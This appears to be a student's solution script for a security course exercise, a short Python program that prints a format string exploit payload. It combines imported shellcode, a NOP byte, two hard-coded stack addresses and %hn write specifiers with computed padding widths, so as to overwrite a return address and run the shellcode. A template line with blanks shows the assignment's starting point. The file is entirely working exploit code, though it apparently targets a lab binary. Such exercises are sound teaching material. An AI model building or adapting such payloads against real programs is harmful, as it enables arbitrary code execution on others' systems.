#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
addr1 = pack("<I", 0xfffe9d1c)
addr2 = pack("<I", 0xfffe9d1e)

# sys.stdout.buffer.write(shellcode + b"\x90" + addr1 + addr2 + "%_____x%__$hn%_____x%__$hn")
sys.stdout.buffer.write(shellcode + b"\x90" + addr1 + addr2 + b"%38136x%07$hn%27366x%08$hn")
